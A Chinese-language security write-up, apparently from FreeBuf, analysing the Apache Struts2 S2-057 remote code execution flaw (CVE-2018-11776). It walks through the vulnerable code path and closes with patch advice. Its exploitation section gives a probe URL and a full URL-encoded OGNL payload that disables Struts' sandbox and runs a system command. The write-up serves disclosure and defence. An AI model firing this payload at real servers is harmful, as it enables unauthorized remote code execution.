***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**

## 前言

 **Apache Struts框架是一个基于 Java Servlets,JavaBeans, 和 JavaServer Pages
(JSP)的Web应用框架的开源项目，Struts基于Model-View-Controller
(MVC)的设计模式，可以用来构件复杂的Web应用。它允许我们分解一个应用程序的商业逻辑、控制逻辑和表现逻辑的代码，使它的重用性和维护性更好。Struts框架是Jakarta工程的一部分，由Apache软件基金会管理。**

 **天融信阿尔法实验室将为你带来Apache Struts2 S2-057远程代码执行漏洞分析~**

## 一、 漏洞描述

当struts.mapper.alwaysSelectFullNamespace设置为true，并且package标签页以及result的param标签页的namespace值的缺失，或使用了通配符时可造成namespace被控制，最终namespace会被带入OGNL语句执行，从而产生远程代码执行漏洞。

### 1\. 受影响的系统版本

Apache Struts 2.3 - Struts 2.3.34

Apache Struts 2.5 - Struts 2.5.16

### 2\. 漏洞编号

CVE-2018-11776

## 二、环境搭建

1.下载：<http://archive.apache.org/dist/struts/2.3.34/struts-2.3.34-all.zip>

2\. 修改配置文件struts-actionchaining.xml

该漏洞有多种攻击向量包括：

> Redirect action
>
> Action chaining
>
> Postback result

以第一种为例子，修改配置文件内容为：

![修改配置文件内容](https://image.3001.net/images/20180824/1535104197_5b7fd4c50d9d3.png!small)  

## 三、漏洞细节

在DefaultActionMapper这个类的parseNameAndNamespace方法里。

![parseNameAndNamespace方法](https://image.3001.net/images/20180824/1535104208_5b7fd4d097c75.png!small)

当alwaysSelectFullNamespace被设置为true时，namespace的值是从URL中获取的。URL是可控的，所以namespace也是可控的。

Action执行结束之后，程序会调用ServletActionRedirectResult类中的execute()方法进行重定向Result的解析。

![进行重定向Result的解析](https://image.3001.net/images/20180824/1535104218_5b7fd4da0b70d.png!small)

首先，当namespace为空时，调用invocation.getProxy().getNamespace()赋值给变量namespace，然后将变量namespace传入ActionMapping构造函数中。

![传入ActionMapping构造函数](https://image.3001.net/images/20180824/1535104222_5b7fd4de51dfe.png!small)

然后，ActionMapper.getUriFromActionMapping()对ActionMapping后的值进行重组，生成一个URL字符串（包含namespace），并赋值给了tmplocation变量。

![赋值给了tmplocation](https://image.3001.net/images/20180824/1535104228_5b7fd4e45257f.png!small)

紧接着将带有namespace的tmplocation传入了setLocation()方法中。

![传入了setLocation\(\)方法](https://image.3001.net/images/20180824/1535104233_5b7fd4e978504.png!small)

该方法将tmpLocation值赋值给了StrutsResultSupport类中的location变量。

然后，跟踪super.execute()方法。

![跟踪super.execute\(\)方法](https://image.3001.net/images/20180824/1535104246_5b7fd4f67233c.png!small)

继续跟踪ServletActionResult类中的super.execute()。

![跟踪ServletActionResult类中的super.execute](https://image.3001.net/images/20180824/1535104254_5b7fd4fe9f497.png!small)

在StrutsResultSupport类中的execute()方法中，刚刚被赋值的location变量（带有namespace的）被传入了conditionalParse()方法。

![传入了conditionalParse\(\)方法](https://image.3001.net/images/20180824/1535104259_5b7fd5034831c.png!small)

最终，通过TextParseUtil.translateVariables()对namespace进行OGNL解析，导致远程代码执行漏洞。

## 四、漏洞利用

1\. 访问url 为/${(111+111)}/actionChain1.action的地址。

![访问url
为/${\(111+111\)}/actionChain1.action](https://image.3001.net/images/20180824/1535104265_5b7fd50985775.png!small)

访问触发OGNL表达式，url变为/222/register2.action，漏洞存在。

2\. payload：

    
    
    %24%7b(%23dm%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3d%23request%5b%27struts.valueStack%27%5d.context).(%23cr%3d%23ct%5b%27com.opensymphony.xwork2.ActionContext.container%27%5d).(%23ou%3d%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23cmd%3d%40java.lang.Runtime%40getRuntime().exec(%22calc%22))%7d

此payload 仅适用于2.3系列版本。

![payload](https://image.3001.net/images/20180824/1535104272_5b7fd5103bcfb.png!small)

## 五、修复建议

### 1\. 官方补丁

目前官方已发布最新版本来修复此漏洞，受影响的用户请尽快升级到Apache Struts 2.3.35 或 Struts
2.5.17版本：<https://struts.apache.org/download.cgi#struts2517>。

### 2\. 手工修复

修改配置文件：

固定package标签页以及result的param标签页的namespace值，以及禁止使用通配符。

 ***本文作者：alphalab，转载请注明来自FreeBuf.COM**

